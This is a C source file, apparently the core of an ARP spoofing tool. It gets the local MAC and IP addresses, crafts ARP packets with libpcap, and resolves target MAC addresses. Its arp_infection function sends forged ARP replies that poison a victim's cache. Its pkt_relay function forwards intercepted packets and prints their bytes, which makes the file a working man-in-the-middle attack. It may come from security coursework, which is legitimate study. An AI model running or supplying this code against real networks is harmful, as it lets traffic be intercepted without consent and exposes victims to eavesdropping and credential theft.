#include "arp.h"

void print_mac(uint8_t *addr)
{
	for(int i = 0; i < 6; i++)
	{
		printf("%x", addr[i]);
		if(i != 5) printf(":");
	}
}

void print_ip(uint8_t *addr)
{
	for(int i = 0; i < 4; i++)
	{
		printf("%u", addr[i]);
		if(i != 3) printf(".");
	}
}

void get_my_mac(uint8_t *addr)
{
	struct ifreq ifr;
	struct ifconf ifc;
	char buf[1024];
	int success = 0;

	int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	if (sock == -1) 
	{ 
		printf("error\n");
		exit(0);
	}

	ifc.ifc_len = sizeof(buf);
	ifc.ifc_buf = buf;
	if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) 
	{ 
		printf("error\n");
		exit(0);
	}

    	struct ifreq* it = ifc.ifc_req;
 	const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

   	for (; it != end; ++it) 
	{
       		strcpy(ifr.ifr_name, it->ifr_name);
		if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) 
		{
            		if (! (ifr.ifr_flags & IFF_LOOPBACK)) 
			{
                		if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) 
				{
                   			success = 1;
                    			break;
                		}
            		}
        	}
        	else 
		{ 
			printf("error\n");
		}
	}
	if (success) memcpy(addr, ifr.ifr_hwaddr.sa_data, 6);
	printf("[+] My MAC Address is ");
	print_mac(addr);
	printf("\n");
}

void get_my_ip(uint8_t *addr, char *interface) 
{
	struct ifreq ifr;
	struct sockaddr_in * sin;
	uint32_t s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, interface, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) 
	{
		printf("Error0\n");
		close(s);
		exit(1);
  	} 
	else 
	{
		sin = (struct sockaddr_in *)&ifr.ifr_addr;
    		memcpy(addr, (void*)&sin->sin_addr, sizeof(sin->sin_addr));
		close(s);
  	}
	printf("[+] My IP Address is ");
	print_ip(addr);
	printf("\n");
}

void make_arp(u_char *packet, uint8_t *src_mac, uint8_t *dst_mac, uint16_t op,
			  uint8_t *send_mac, uint8_t *send_ip, uint8_t *tar_mac, uint8_t *tar_ip) 
{
	ether_header ethhdr;
	arp_header arphdr;

	memcpy(ethhdr.dst_mac, dst_mac, ADDR_LEN_MAC);
	memcpy(ethhdr.src_mac, src_mac, ADDR_LEN_MAC);
	ethhdr.ether_type = htons(ETHERTYPE_ARP);

	arphdr.hw_type = htons(HWTYPE_ETHER);
	arphdr.proto_type = htons(PROTOTYPE_IP);
	arphdr.hw_addr_len = ADDR_LEN_MAC;
	arphdr.proto_addr_len = ADDR_LEN_IP;
	arphdr.op = htons(op);
	memcpy(arphdr.send_mac, send_mac, ADDR_LEN_MAC);
	memcpy(arphdr.send_ip, send_ip, ADDR_LEN_IP);
	memcpy(arphdr.tar_mac, tar_mac, ADDR_LEN_MAC);
	memcpy(arphdr.tar_ip, tar_ip, ADDR_LEN_IP);

	memcpy(packet, (u_char*)&ethhdr, sizeof(ethhdr));
	memcpy(packet + sizeof(ethhdr), (u_char*)&arphdr, sizeof(arphdr));
}

void get_mac_addr(uint8_t *ip_addr) 
{
	u_char send_pkt[50];
	const u_char *recv_pkt;
	struct pcap_pkthdr *header;
	
	make_arp(send_pkt, my_mac, mac_ff, 
		 ARP_REQUEST, my_mac, my_ip, mac_00, ip_addr);
	pcap_sendpacket(handle, send_pkt, ARP_PACKET_SIZE);	

	while (true) 
	{
		int res = pcap_next_ex(handle, &header, &recv_pkt);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
		ether_header *ethhdr = (ether_header*)recv_pkt;
		arp_header *arphdr = (arp_header*)(recv_pkt + sizeof(ether_header));

		if((ntohs(ethhdr->ether_type) == ETHERTYPE_ARP) && 
	   	   (ntohs(arphdr->op) == ARP_REPLY) &&
	   	   (!memcmp(arphdr->send_ip, ip_addr, ADDR_LEN_IP))) 
		{
			memcpy(ip2mac[*(uint32_t*)ip_addr], arphdr->send_mac, ADDR_LEN_MAC);
			break;
		}
	}
	print_ip(ip_addr);
	printf(" is at ");
	print_mac(ip2mac[*(uint32_t*)ip_addr]);
	printf("\n");
}

void arp_infection(session s)
{
	u_char send_pkt[50];

	make_arp(send_pkt, my_mac, ip2mac[s.send_ip], 
		 ARP_REPLY, my_mac, (uint8_t*)&s.tar_ip, 
		 ip2mac[s.send_ip], (uint8_t*)&s.send_ip);
	pcap_sendpacket(handle, send_pkt, ARP_PACKET_SIZE);

	printf("[+] Attacked Session : ");
	print_ip((uint8_t*)&s.send_ip);
	printf("(");
	print_mac(ip2mac[s.send_ip]);
	printf(") -> ");
	print_ip((uint8_t*)&s.tar_ip);
	printf("(");
	print_mac(ip2mac[s.tar_ip]);
	printf(")\n");
	printf("====================================\n");
}

void pkt_relay(const u_char *pkt, uint32_t len, session s)
{
	ether_header *ethhdr = (ether_header*)pkt;
	
	memcpy(ethhdr->src_mac, my_mac, ADDR_LEN_MAC);
	memcpy(ethhdr->dst_mac, ip2mac[s.tar_ip], ADDR_LEN_MAC);
	pcap_sendpacket(handle, pkt, len);

	printf("[+] Relayed Packet from ");
	
	print_mac(ip2mac[s.send_ip]);
	printf(" to ");
	print_mac(ip2mac[s.tar_ip]);
	printf("\n");

	for(int i = 0; i < 5; i++)
	{
		for(int j = 0; j < 16; j++)
			printf("%02x ", pkt[i * 16 + j]);
		printf("\n");
	}
	printf("====================================\n");
}

